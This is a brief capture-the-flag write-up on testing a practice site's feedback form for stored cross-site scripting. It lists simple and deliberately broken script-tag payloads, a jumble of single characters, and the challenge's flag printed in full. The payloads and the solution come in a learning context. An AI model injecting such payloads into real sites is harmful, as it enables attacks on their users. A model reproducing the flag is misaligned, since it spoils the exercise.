# Cross-site Scripting (XSS)
	
The feedback page allow us to post coments on the site with a form.
First thing to do in that case is check if the site is protected against XSS injection.
The most easier way is to try to pop an _alert_ with an html tag _\<script\>_

We write this comment in the feedback page with any name:
```html
<script>alert</script>
```

_The trick in here is that this exploit contains an error in source code. Only a broken command drop the flag like_:
```html
<script>a</script>
<script>al</script>
<script>ale</script>
<script>aler</script>
<script>a
```
_wtf part_:
a
l
e
r
t
p
<
s
c
i
>

THE FLAG IS : 0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E

## External Resources

https://owasp.org/www-community/attacks/xss/
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting


